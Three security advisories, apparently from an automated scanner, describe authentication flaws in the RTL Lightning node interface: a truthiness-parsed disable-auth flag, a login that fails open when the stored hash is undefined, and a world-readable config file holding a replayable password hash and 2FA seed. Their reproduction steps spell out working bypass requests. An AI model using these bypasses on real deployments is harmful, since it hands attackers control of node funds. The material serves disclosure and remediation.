# disableAuth / DISABLE_AUTH parsed by truthiness: the string 'false' disables authentication

## Details
RTL's switch for turning its own authentication off is read with JavaScript truthiness in server/utils/config.ts:135 (`!!process?.env?.DISABLE_AUTH || !!config.disableAuth`) and again in server/controllers/shared/authenticate.ts:152 (`!!common.appConfig.disableAuth`). Neither site checks the value's type or content, so every non-empty string -- including the natural 'off' spellings `false`, `0` and `no` -- means 'disable'. The project's own documentation presents the key as a quoted-string placeholder with "default 'false'" (.github/docs/Application_configurations.md:9), Sample-RTL-Config.json quotes its scalars (`"port": "3000"`), and container/EnvironmentFile templates emit `DISABLE_AUTH=false` for an unset boolean, since environment values are always strings.

Two misconfigurations, each made by an operator who intends authentication to stay ON, turn it OFF:

1. RTL-Config.json contains `"disableAuth": "false"` (string). config.ts:135 is truthy, so no password is configured; `common.appConfig = config` (config.ts:396) carries the string into the running server; authenticate.ts:152 is truthy, so any POST /rtl/api/authenticate -- with any or no body, no 2FA, no lockout -- is answered with an AUTH_DISABLED_USER JWT that isAuthenticated accepts on every API route (the route is unguarded, server/routes/shared/authenticate.ts:8, and GET /rtl/ hands any visitor the CSRF pair, app.ts:104-115). The unauthenticated GET /rtl/api/conf/ returns the same raw value (removeSecureData does not strip it) and the shipped frontend's `!!action.payload.disableAuth` (app.component.ts:106) logs every visitor in automatically, so the operator never sees a login page and has no signal that the node UI is open to anyone who can reach it.

2. The environment carries `DISABLE_AUTH=false` (file without a disableAuth key). config.ts:135 is truthy, so rtlPass is never assigned and password updates are disabled, but config.disableAuth is never set from the environment, so appConfig.disableAuth stays undefined and authenticate.ts routes logins into the password branch with an undefined stored hash. The operator's own password now fails ('Invalid Password!'), while an unauthenticated POST whose JSON body omits authenticationValue satisfies `undefined === undefined` (authenticate.ts:196) and receives a NODE_USER JWT -- the sink verified as rtl-password-login-fails-open-when-stored-hash-undefined; this is an additional producer of that state. Because config.ts:153 re-derives enable2FA from the seed after the branch, the TOTP gate still stands in this form only if a secret2FA is on file. The same half-applied env handling means the documented `DISABLE_AUTH=1` vendor form never reaches the designed disabled-auth branch either: the UI shows a login page that rejects every password, and only a hand-crafted POST omitting authenticationValue yields a token.

The only boot-time validation on this key is the APP_PASSWORD conflict message (config.ts:139-141); there is no rejection of non-boolean values and no notice naming the parsed value. The 'Authentication is Disabled' line at config.ts:138 is logged at WARN while common.selectedNode is still null (setSelectedNode runs after validateNodeConfig, config.ts:394-395), a combination logger.ts:25-32 drops entirely, so the operator gets no signal at all. ENABLE_OFFERS/ENABLE_PEERSWAP (config.ts:281-282) share the pattern but only toggle UI features; RTL_SSO is coerced with unary plus and is covered by the verified record above.

SECURITY.md excludes deployments that deliberately enable disableAuth so a vendor can supply its own authentication; this finding is about deployments that deliberately keep RTL's authentication on and are silently granted the opposite. With either misconfiguration an unauthenticated network attacker who can reach RTL (or its reverse proxy) obtains the single operator role: read everything RTL exposes (masked config, /conf/file and /conf/config, channel backups, node data), send Lightning and on-chain payments, open/close channels, rewrite RTL and node settings.

## Evidence
1. [server/utils/config.ts:134–141](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/utils/config.ts#L134-L141)
   The authentication mode is chosen with `!!process?.env?.DISABLE_AUTH || !!config.disableAuth` (line 135). Neither operand is checked for type or content: every non-empty environment string ('false', '0', 'no') and every non-empty JSON string in RTL-Config.json (`"disableAuth": "false"`) is truthy, so the branch that suppresses password configuration is taken -- allowPasswordUpdate=false and none of the following else-if branches ever assigns config.rtlPass. The env form never writes config.disableAuth, so for env-only deployments the value that authenticate.ts later reads stays whatever the file says (normally absent). The only validation on this key is the APP_PASSWORD conflict message (lines 139-141); line 153 (`config.enable2FA = !!config.secret2FA`) runs after the chain and overrides line 137, so enable2FA follows the seed in every branch.
2. [server/controllers/shared/authenticate.ts:152–156](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/controllers/shared/authenticate.ts#L152-L156)
   At request time the disabled-auth branch is again `!!common.appConfig.disableAuth`. When the file holds the string "false" this is true and every POST /rtl/api/authenticate -- with any body or none, no password, no 2FA, no lockout -- is answered with an AUTH_DISABLED_USER JWT that isAuthenticated (server/utils/authCheck.ts:10-20) accepts on every API route and verifyWSUser accepts on the WebSocket.
3. [server/controllers/shared/authenticate.ts:189–196](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/controllers/shared/authenticate.ts#L189-L196)
   For the env form (DISABLE_AUTH=false with no disableAuth key in the file) appConfig.disableAuth is undefined, so the request falls into the password branch with rtlPass undefined: the operator's real password (a sha256 string) never matches, while a body that omits authenticationValue satisfies `undefined === undefined` at line 196 and is minted a NODE_USER JWT. This is the sink already verified as rtl-password-login-fails-open-when-stored-hash-undefined (producers: RTL_SSO coercion and hash-persist failure); DISABLE_AUTH truthiness is a third producer of the same state. The TOTP gate at line 194 still stands here only when a secret2FA is on file (config.ts:153 derives enable2FA from the seed).
4. [server/utils/config.ts:394–396](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/utils/config.ts#L394-L396)
   validateNodeConfig runs before setSelectedNode and then `this.common.appConfig = config` stores the parsed file object as-is, so the raw string "false" is what authenticate.ts and getApplicationSettings read; common.selectedNode (initialised to null at server/utils/common.ts:14) is still null while the WARN at config.ts:138 is emitted.
5. [.github/docs/Application\_configurations.md:8–9](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/.github/docs/Application_configurations.md#L8-L9)
   The documented RTL-Config.json template presents disableAuth as a quoted string placeholder ("default 'false'") while leaving genuinely numeric/boolean keys such as defaultNodeIndex and rtlSSO unquoted, inviting exactly the `"disableAuth": "false"` spelling the code reads as true. The env section (line 60) gives no value format. Sample-RTL-Config.json omits the key, so operators who add it copy this template.
6. [src/app/app.component.ts:104–107](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/src/app/app.component.ts#L104-L107)
   The shipped frontend applies the same `!!action.payload.disableAuth` to the unauthenticated GET /rtl/api/conf/ response and dispatches an automatic login (sent as authenticateWith NOAUTH, rtl.effects.ts:383-386), so with the file value "false" every visitor's browser logs itself in; the operator sees no login page and no indication that authentication is off.
7. [server/controllers/shared/RTLConf.ts:197–224](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/controllers/shared/RTLConf.ts#L197-L224)
   getApplicationSettings (unauthenticated GET /rtl/api/conf/) returns appConfig after removeSecureData (server/utils/common.ts:78-91), which strips credentials but not disableAuth, so the raw value drives the frontend auto-login above and tells any attacker which mode the server is in.
8. [server/routes/shared/authenticate.ts:8](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/routes/shared/authenticate.ts#L8)
   authenticateUser is mounted with no isAuthenticated guard: the POST that returns the operator JWT is reachable by any network client.
9. [server/utils/app.ts:104–114](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/utils/app.ts#L104-L114)
   The catch-all GET of /rtl/ mints the csrf-csrf pair (_csrf cookie plus JS-readable XSRF-TOKEN) for any visitor, so the app-wide CSRF middleware is no obstacle to an attacker scripting the login POST.
10. [server/utils/logger.ts:25–32](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/utils/logger.ts#L25-L32)
   WARN-level messages are never written to the console and are appended only when selectedNode has a logFile; with selectedNode null at config.ts:138 the only notice that authentication was disabled is discarded, so the misconfiguration is silent.

## Impact
The minted JWT is RTL's only role: every API route checks just isAuthenticated. The attacker reads all node data, RTL configuration and channel backups (C:H), sends payments, changes channels and rewrites RTL/node settings including RTL-Config.json via the settings API (I:H), and can lock the operator out or disrupt RTL by changing settings (A:H). Subsequent-system impact: RTL is the control plane for the Lightning node behind it: with the operator session the attacker moves the node's funds (Lightning and on-chain sends), force-closes channels and reads node/bitcoind config via /conf/file and /conf/config. Node availability is only partially affected (channel closures; RTL exposes no stop-daemon call).

## Reproduction steps
1. Attacker: unauthenticated party able to reach RTL's HTTP port or its reverse proxy (AV:N). Precondition outside the attacker's control: the operator wrote the string "false" (or any non-empty non-boolean) for disableAuth in RTL-Config.json or DISABLE_AUTH in the environment, intending authentication on (AT:PRESENT). File form: GET /rtl/ for the CSRF pair, then POST /rtl/api/authenticate with any body -> operator JWT; visiting the UI auto-logs-in. Env form: POST {"authenticateWith":"PASSWORD"} omitting authenticationValue -> operator JWT unless a TOTP seed is configured. No privileges, no user interaction, nothing to defeat (AC:L).

## Recommended fix
1. config.ts:135 and authenticate.ts:152 decide whether RTL's authentication is active from the truthiness of a value that may be a string, so the documented-looking spellings 'false' and '0' enable the disabled-auth mode. Fix criteria: Authentication is disabled only for the JSON boolean true in RTL-Config.json or an explicit allowlisted environment spelling (e.g. exactly '1' or 'true', case-insensitive); the strings 'false', '0', 'no' and '' keep authentication on, and any other value refuses to boot with an error naming the key and the value. The runtime check must consume the same normalized boolean. Verify: boot with "disableAuth": "false" and with DISABLE_AUTH=false -- the login page is shown, the operator's password works, and POST /rtl/api/authenticate with an arbitrary or empty body returns 401.
2. The environment form of the switch is only half-applied: it suppresses password configuration but never sets appConfig.disableAuth, so env-only deployments end up with no configured credential rather than in the designed disabled-auth branch. Fix criteria: After boot, appConfig.disableAuth reflects the effective (normalized) switch regardless of whether it came from the file or the environment, and whenever it is false a non-empty password hash must be configured or boot must fail. Verify: with DISABLE_AUTH=1 the frontend auto-login path is taken and no password branch is reachable; with it unset or 'false', rtlPass is a non-empty string before the server listens.

---
**Severity:** CRITICAL
**Status:** Open
**Category:** Authentication bypass
**CWE:** [CWE-1287](https://cwe.mitre.org/data/definitions/1287.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** NONE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** HIGH
**Subsequent system confidentiality impact:** HIGH
**Subsequent system integrity impact:** HIGH
**Subsequent system availability impact:** LOW
**Repository:** Halbarevi/RTL
**Branch:** main
**Commit:** bcb0e14df92aeed05365eb2437fed91ce34dd7d4
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01Atm9gjYPACbzrr7Sgndbaa&finding=scan_01LNWCWbHCuvVX1Hp5eLnrLn-5257336

---

# Password login fails open when stored hash is undefined: omitted authenticationValue matches

## Details
RTL's password check in `authenticateUser` (server/controllers/shared/authenticate.ts:196) is a plain `===` between the stored hash `common.appConfig.rtlPass` and the client-supplied `req.body.authenticationValue`, with no check that either side is a non-empty string (the branch does not even consult `authenticateWith`). The SSO branch beside it (`matchesSSOCookie`, lines 141-147) guards types and lengths; the password branch does not. Whenever `rtlPass` is undefined, an unauthenticated POST to `/rtl/api/authenticate` whose JSON body omits `authenticationValue` (e.g. `{"authenticateWith":"PASSWORD"}`) satisfies `undefined === undefined`, clears the lockout entry and receives a `NODE_USER` JWT, i.e. full operator access. CSRF is no obstacle: the catch-all GET of `/rtl/` (server/utils/app.ts:104-115) hands any visitor the `_csrf`/`XSRF-TOKEN` pair, and the route is mounted without `isAuthenticated` (server/routes/shared/authenticate.ts:8).

`rtlPass` becomes undefined through two producers in the shipped code, neither of which fails loudly:

1. RTL_SSO coercion at boot (server/utils/config.ts:134-158, 327-355). The hash is derived only in the branch taken when RTL_SSO coerces to exactly 0 (or is unset and the file says 0). `RTL_SSO=` (an empty placeholder), `RTL_SSO=false`, `RTL_SSO=no` or any other non-numeric spelling (the docs define only 0 and 1) take the else branch, which sets neither `config.rtlPass` nor `config.enable2FA`; `setSSOParams` stores NaN (or leaves 0), `+rtlSSO` is falsy so the cookie check and its error are skipped, and boot completes although the project's own boot validation is meant to refuse to start without a credential ('Node Authentication can be set with multiPass only'). At request time `+common.appConfig.SSO.rtlSSO` is falsy too, so logins are routed into the password branch with an undefined hash. Because the config file never carries `enable2FA` (RTLConf.ts:448 strips it on every save; it is derived only inside the password branch at config.ts:153), `twoFARequired` is false in this state and the TOTP gate is skipped even when a `secret2FA` is on file. The operator's real password fails ('Invalid Password!'; the UI always sends a sha256 string) while an attacker's omitted-field login succeeds.

2. Failed hash persistence at runtime (server/utils/common.ts:607-620, authenticate.ts:234). `replacePasswordWithHash` returns undefined when reading, parsing or writing RTL-Config.json throws (disk full, permission change, file replaced or hand-edited to invalid JSON since boot): it only logs. `resetPassword` assigns that return value straight into `common.appConfig.rtlPass`, so an operator's routine password change under such a condition silently disables the password until restart; the operator keeps a valid token and may not notice. Here the TOTP gate still stands if 2FA was enabled at boot. (The same unchecked assignment runs at boot for a plaintext `multiPass`, config.ts:149, but `updateConfig` has just written the same file so a failure there is unlikely.)

The minted JWT is accepted by `isAuthenticated` on every API route and the login stores `common.selectedNode` into the session, so payments, channel operations, config reads (`/conf/file`, `/conf/config/:nodeType`) and settings writes are all reachable.

Root cause: a credential comparison that does not require the stored credential to exist nor the offered credential to be a string, combined with coercion and error paths that degrade the stored credential to undefined instead of refusing to boot or refusing authentication.

## Evidence
1. [server/controllers/shared/authenticate.ts:190–214](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/controllers/shared/authenticate.ts#L190-L214)
   The password branch compares `common.appConfig.rtlPass === password` where `password` is `req.body.authenticationValue` taken verbatim (line 150/190) and `authenticateWith` is never consulted. Neither side is checked to be a non-empty string. When `rtlPass` is undefined, a JSON body that omits `authenticationValue` makes the comparison `undefined === undefined` -> true, the lockout entry is cleared and a NODE_USER JWT is minted (line 212). The TOTP gate (lines 194/204) only applies when `enable2FA` and `secret2FA` are both set on the live config.
2. [server/utils/config.ts:134–157](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/utils/config.ts#L134-L157)
   `rtlPass` and `enable2FA` are only ever assigned inside the first branch, taken when RTL_SSO is a string that coerces to exactly 0, or is undefined and the file says 0. Any other RTL_SSO string ("", "false", "true", "yes"...) falls into the else branch, which never sets `config.rtlPass` nor `config.enable2FA` and raises no error unless APP_PASSWORD is also set. `common.appConfig = config` (line 396) then carries `rtlPass: undefined` and `enable2FA: undefined` into the running server, so the password compare fails open and the TOTP gate is inert.
3. [server/utils/config.ts:327–354](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/utils/config.ts#L327-L354)
   setSSOParams stores `+process.env.RTL_SSO` (NaN for non-numeric values; the empty string leaves the file's 0 in place) and only checks the cookie path when `+config.SSO.rtlSSO` is truthy. So `RTL_SSO=false` / `RTL_SSO=` boot without any error, and at request time `+common.appConfig.SSO.rtlSSO` (authenticate.ts line 157) is falsy, routing the login into the password branch whose stored hash was never set.
4. [server/utils/common.ts:607–619](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/utils/common.ts#L607-L619)
   replacePasswordWithHash returns `config.multiPassHashed` on success but on any failure (read, JSON.parse or writeFileSync of RTL-Config.json: ENOSPC, EACCES, file moved or hand-edited to invalid JSON since boot) it only logs and returns undefined.
5. [server/controllers/shared/authenticate.ts:233–236](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/controllers/shared/authenticate.ts#L233-L236)
   resetPassword assigns the return value unconditionally: `common.appConfig.rtlPass = common.replacePasswordWithHash(newPassword)`, and still answers 200 with a fresh token. A failed write therefore replaces the live hash with undefined for the rest of the process lifetime, after which the omitted-field login above succeeds for anyone. The same unchecked assignment exists at boot (config.ts line 149).
6. [server/controllers/shared/RTLConf.ts:448](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/controllers/shared/RTLConf.ts#L448)
   Every settings save deletes `enable2FA` from the persisted file (and Sample-RTL-Config.json never has it), so the on-disk config carries only `secret2FA`. `enable2FA` exists on the live config only when config.ts:153 derives it inside the password branch; under a non-numeric RTL_SSO it is never derived, which is why the TOTP gate at authenticate.ts:194 does not protect that producer.

## Impact
The minted JWT is the operator credential: every API route only checks isAuthenticated and the login stores common.selectedNode in the session. The attacker reads all node data and RTL configuration incl. /conf/file and /conf/config (confidentiality), sends payments, opens/closes channels and rewrites node/application settings (integrity), and can lock the operator out and disrupt RTL (availability). Subsequent-system impact: RTL is the control plane for the Lightning node behind it: with the operator JWT the attacker moves the node's funds, force-closes channels and reads the node and bitcoind config files RTL exposes through /conf/file and /conf/config, so the impact crosses to the node. Availability of the node itself is only partially affected (channel closures, not a shutdown).

## Reproduction steps
1. Unauthenticated network attacker who can reach RTL or its reverse proxy. Step 1: GET /rtl/ to receive connect.sid, _csrf and XSRF-TOKEN cookies (app.ts:104-115). Step 2: POST /rtl/api/authenticate with those cookies, header X-XSRF-TOKEN, body {"authenticateWith":"PASSWORD"} with no authenticationValue. When rtlPass is undefined -- RTL_SSO set to an empty or non-numeric string at boot (in which case enable2FA is also unset and no TOTP gate applies), or a password reset whose config write failed (TOTP gate remains if 2FA was enabled at boot) -- the response is 200 with a NODE_USER JWT. Attack requirements are PRESENT: the server must be in one of these states, which the attacker cannot induce; otherwise no privileges, no user interaction and nothing to defeat.

## Recommended fix
1. authenticateUser compares the stored hash to the client value without requiring the stored hash to be a non-empty string or the offered value to be a string, so an absent credential matches an absent input. Fix criteria: A login request whose authenticationValue is missing, empty or not a string is refused with 401 regardless of server state, and when rtlPass is not a non-empty string every password login is refused (and the condition logged at ERROR). Verify: with rtlPass forced to undefined, POST {"authenticateWith":"PASSWORD"} with a valid CSRF pair returns 401 and no token.
2. replacePasswordWithHash swallows file errors and returns undefined, and both resetPassword and boot assign that return value into the live hash, degrading the credential on failure. Fix criteria: A failed persistence of the new hash must not change the live hash (keep the previous value and return an error to the caller: 500 on reset, fatal at boot). Verify: with RTL-Config.json unwritable, a password reset returns an error, the old password still works and an omitted-value login is refused.
3. RTL_SSO is coerced with unary plus; empty or non-numeric values select neither the SSO nor the password configuration yet boot without error, leaving no credential configured and enable2FA unset while the runtime check routes logins to the password branch. Fix criteria: Boot must reject any RTL_SSO value that is not exactly 0 or 1 (and rtlSSO in the file likewise), the runtime mode decision must use the same validated value the config loader used, and enable2FA must be derived from the seed regardless of branch. Verify: RTL_SSO=false and RTL_SSO= each fail startup with a clear error instead of starting with rtlPass undefined.

---
**Severity:** CRITICAL
**Status:** Open
**Category:** Authentication bypass
**CWE:** [CWE-305](https://cwe.mitre.org/data/definitions/305.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** NONE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** HIGH
**Subsequent system confidentiality impact:** HIGH
**Subsequent system integrity impact:** HIGH
**Subsequent system availability impact:** LOW
**Repository:** Halbarevi/RTL
**Branch:** main
**Commit:** bcb0e14df92aeed05365eb2437fed91ce34dd7d4
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01Atm9gjYPACbzrr7Sgndbaa&finding=scan_01LNWCWbHCuvVX1Hp5eLnrLn-5257266

---

# RTL-Config.json created at first boot with default (umask) mode; holds pass-the-hash password and 2FA seed

## Details
server/utils/config.ts setServerConfiguration creates RTL-Config.json on first boot when it is absent (lines 387-389) with fs.writeFileSync and no mode argument, so the file gets 0666 & ~umask -- 0644 under the common 022 umask -- i.e. readable by every local account. Every later RTL write to the file keeps that mode: updateConfig (config.ts:380) and updateLogByLevel (config.ts:125) rewrite in place, common.replacePasswordWithHash (common.ts:607-620, called at boot and on every operator password change) rewrites in place, updateNodeSettings (RTLConf.ts:311) rewrites in place, and the application-settings save (RTLConf.ts:467-471) explicitly chmods its 0600 temp file to the existing file's mode before renaming it over. Nothing in server/ ever tightens the path (the chmod at RTLConf.ts:470 is the only one in the tree). The maintainers' own comment at RTLConf.ts:462-465 states the standard for this file -- its secrets ('2FA seed, password hash, credential paths') 'are never world-readable' and 'a fresh file gets 0600' -- so the boot-time creator diverges from the project's own control for the same file, and the mode-preservation logic then locks the permissive mode in for the life of the deployment. Assumption: Node >=20.19 (package.json engines; node:22-alpine in the Dockerfile) applies its documented writeFileSync default mode 0o666 masked by the process umask.

The file is RTL's primary secrets store. Within a normal operator lifecycle it comes to hold: multiPassHashed, which is not a protective hash but the login credential itself -- authenticate.ts:196 compares `appConfig.rtlPass === authenticationValue` and the frontend sends sha256(password) (login.component.ts:95/99), so the stored value is posted verbatim; secret2FA, the TOTP seed the settings save persists (RTLConf.ts:441-456, common.ts addSecureData/128-144), from which valid second-factor codes are computed (authenticate.ts:114); for Eclair nodes the plaintext lnApiPassword (direct basic-auth control of the node); and the macaroon/rune/config paths plus lnServerUrl. On the first boot itself the file briefly contains the plaintext default `multiPass: 'password'` before replacePasswordWithHash swaps in its hash.

Attack: an unprivileged local account on the host where RTL runs (or any process that can read the config directory other than RTL's own user) reads RTL-Config.json, then from anywhere that reaches RTL's port does GET /rtl/ for the CSRF pair and POST /rtl/api/authenticate {authenticateWith:'PASSWORD', authenticationValue:<multiPassHashed>, twoFAToken:<TOTP from secret2FA>}. RTL answers with the NODE_USER JWT -- the single operator role: send Lightning and on-chain payments, open/close channels, change RTL and node settings, download channel backups. For an Eclair node the reader can skip RTL and use lnApiPassword against the node directly.

Conditions: the path holds when RTL itself created the file and the directory is traversable by other local accounts. RTL creates it whenever RTL_CONFIG_PATH -- documented as 'the folder containing RTL-Config.json' (Application_configurations.md:71) -- holds no file: the shipped Docker image copies no config and no Sample-RTL-Config.json (Dockerfile COPY list), runs `node rtl` as root with no USER or VOLUME, so a container started with a bind-mounted empty config directory leaves a root-owned 0644 file on the host readable by every host account; a standalone `node rtl`/systemd deployment (README:140-152 runs it as a dedicated `User=<user>` on a multi-user Linux host) that starts before the operator renamed Sample-RTL-Config.json gets the same file. When the operator created the file by copying Sample-RTL-Config.json (README:75) the initial mode is theirs, but RTL still writes new secrets (the password hash on reset, the 2FA seed on enable) into whatever mode it finds instead of tightening it, and the docs give no permission or umask guidance for the file (the only permission note in the docs concerns writability of channelBackupPath). The exception is a deployment whose password comes from APP_PASSWORD (config.ts:143-146): the file then holds only the known default `multiPass: 'password'` and the real credential stays in the environment -- but APP_PASSWORD is documented as 'NOT suggested for standalone RTL applications, only to be used by Vendors providing their own authentication service' (Application_configurations.md:59), so the default password deployment is the exposed one. The shipped Docker image's root-owned, un-mounted /RTL is not exposed (no other users in the container).

The recorded threat model does not enumerate a local-account adversary; this finding adds that boundary. SECURITY.md's in-scope list names 'anything that lets an unauthenticated or lower-privileged party do what only the authenticated node operator should' and 'exposure of ... config file contents', and the project's own code (RTLConf.ts:462-465) does not concede the file's contents to local readers. This is the sibling the verified finding sso-cookie-file-created-with-default-world-readable-permissions explicitly set aside ('RTL-Config.json created by config.ts:388 is likewise written with default mode; that is a sibling defect outside this finding'): a different file, writer, consumer and deployment mode (password deployments, the default, vs SSO=1). The rejected record ecl-api-password-persisted-to-rtl-config-on-settings-save concerned an operator-authored, documented config-file field landing in an operator-made file; here RTL creates the file and chooses its mode, and the values exposed (password hash, TOTP seed) are ones the project's own code says must stay owner-only. The default credential 'password' in setDefaultConfig is documented (README:124) and the UI forces its reset (rtl.effects.ts:611-614), so it is not part of this finding.

## Evidence
1. [server/utils/config.ts:387–389](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/utils/config.ts#L387-L389)
   setServerConfiguration: when RTL-Config.json is absent at RTL_CONFIG_PATH (or the repo root) it is created with fs.writeFileSync(confFileFullPath, JSON.stringify(setDefaultConfig(), null, 2), 'utf-8') and no mode option, so the file is 0666 & ~umask (0644 under the usual 022). setDefaultConfig (lines 62-96) seeds it from MACAROON_PATH/LN_SERVER_URL-style env vars and, with SSO.rtlSSO 0 (the default), multiPass 'password', which config.ts:149 immediately replaces with its SHA-256 via replacePasswordWithHash. The compiled backend/utils/config.js:407-409 is identical. This is RTL's own creation of a secrets file; the project's own standard for this same file is 0600 (RTLConf.ts:462-465: 'a fresh file gets 0600', secrets 'never world-readable'), which this creator bypasses.
2. [server/utils/common.ts:607–619](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/utils/common.ts#L607-L619)
   replacePasswordWithHash rewrites the same path in place with writeFileSync and no mode: writing an existing inode keeps its mode, so the permissive mode set at creation is preserved while the content now holds multiPassHashed. It runs at boot (config.ts:149) and on every operator password change (authenticate.ts:234).
3. [server/controllers/shared/RTLConf.ts:466–470](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/controllers/shared/RTLConf.ts#L466-L470)
   The settings-save path creates its temp file 0600 'so the secrets it carries (2FA seed, password hash, credential paths) are never world-readable' and then chmods it to the EXISTING file's mode. The maintainers therefore know the file is a secrets file, yet the boot-time creation gives it a permissive mode that this preservation logic then keeps for the life of the deployment; nothing in server/ ever tightens it (the only chmod in the tree is this one). The save also persists secret2FA and multiPassHashed into the file (lines 441-456 keep both).
4. [server/controllers/shared/authenticate.ts:189–196](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/controllers/shared/authenticate.ts#L189-L196)
   The password check is `common.appConfig.rtlPass === password` where rtlPass is config.multiPassHashed (config.ts:147) and password is the client-sent value. The stored hash is thus the credential itself: whoever reads it from the file can POST it verbatim as authenticationValue -- no cracking needed.
5. [src/app/shared/components/login/login.component.ts:94–99](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/src/app/shared/components/login/login.component.ts#L94-L99)
   The shipped frontend sends sha256(password) as the login value, confirming that the server-stored unsalted SHA-256 is exactly what the wire carries: pass-the-hash by design.
6. [server/controllers/shared/authenticate.ts:114](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/controllers/shared/authenticate.ts#L114)
   verifyToken checks the TOTP against common.appConfig.secret2FA, which the settings save persists into the same file; a reader of the file can compute valid 2FA codes, so the second factor does not stand in the way.
7. [server/utils/config.ts:124–125](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/utils/config.ts#L124-L125)
   updateLogByLevel rewrites the file in place with no mode (and updateConfig at line 380 does the same on every boot), so every RTL rewrite path preserves rather than repairs the creation mode.
8. [Dockerfile:27–38](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/Dockerfile#L27-L38)
   The image runs `node rtl` as root from /RTL with no USER, no VOLUME and no RTL_CONFIG_PATH, so the default path is /RTL/RTL-Config.json; when operators bind-mount a host directory there for persistence (the only way to keep the config), the first-boot file appears on the host as root-owned 0644, readable by every host account.

## Impact
The file yields RTL's operator credential and 2FA seed directly, and the resulting JWT is RTL's single operator role: full read of everything RTL exposes including config and channel backups (C:HIGH), every state-changing action including settings writes back to RTL-Config.json (I:HIGH), and the ability to change the password/settings to lock the real operator out (A:HIGH). Subsequent-system impact: Through the operator session the attacker directs the Lightning node -- a separate process RTL authenticates to with its stored macaroon/rune/API password -- to send on-chain and Lightning payments, close channels and change node settings; for Eclair the file's plaintext lnApiPassword gives direct node API control without RTL. Loss of funds and node disruption cross RTL's boundary.

## Reproduction steps
1. Attacker: an unprivileged local account on the RTL host or a process sharing the config directory (AV:LOCAL, PR:LOW). Under umask 022 the file RTL creates is 0644, so reading it, then posting multiPassHashed verbatim (plus a TOTP computed from secret2FA where enabled) to /rtl/api/authenticate is deterministic and repeatable (AC:LOW), with no operator action (UI:NONE). It depends on RTL having created the file (first boot without a pre-made config) and on the directory being reachable by other accounts -- standalone or bind-mounted deployments rather than the un-mounted root container -- so AT:PRESENT. Assumes Node's documented writeFileSync default mode 0o666.

## Recommended fix
1. setServerConfiguration creates RTL-Config.json with fs.writeFileSync and no mode, so the secrets file inherits the process umask and is readable by other local accounts; every later RTL rewrite (updateConfig, updateLogByLevel, replacePasswordWithHash, the settings-save chmod-to-existing-mode) preserves that mode instead of correcting it. Fix criteria: RTL-Config.json must be created owner-only (no group/other bits) regardless of umask, and every RTL write path that adds secrets to it (boot hash replacement, password reset, 2FA enable/settings save) must ensure the file carries no 'other' read permission afterwards -- tightening a wider existing mode, or refusing to proceed and logging at ERROR. Verify: after a first boot from an empty config directory, after a password reset and after enabling 2FA, stat on RTL-Config.json shows mode 0600 (or at most owner+group) and a non-owner local account cannot read it.
2. The stored password hash is the login credential itself (unsalted SHA-256 compared verbatim with the client-hashed value), so any disclosure of the file is an immediate operator login rather than an offline cracking problem. Fix criteria: Disclosure of RTL-Config.json must not by itself yield a working login: the server should verify the client-supplied value against a salted, slow server-side hash (so the on-disk value cannot be replayed as authenticationValue). Verify: posting the on-disk hash value as authenticationValue returns 401 while the operator's password still logs in.

---
**Severity:** HIGH
**Status:** Open
**Category:** Incorrect default permissions
**CWE:** [CWE-276](https://cwe.mitre.org/data/definitions/276.html)
**Attack vector:** LOCAL
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** HIGH
**Subsequent system confidentiality impact:** HIGH
**Subsequent system integrity impact:** HIGH
**Subsequent system availability impact:** HIGH
**Repository:** Halbarevi/RTL
**Branch:** main
**Commit:** bcb0e14df92aeed05365eb2437fed91ce34dd7d4
**Date created:** 2026-10-18
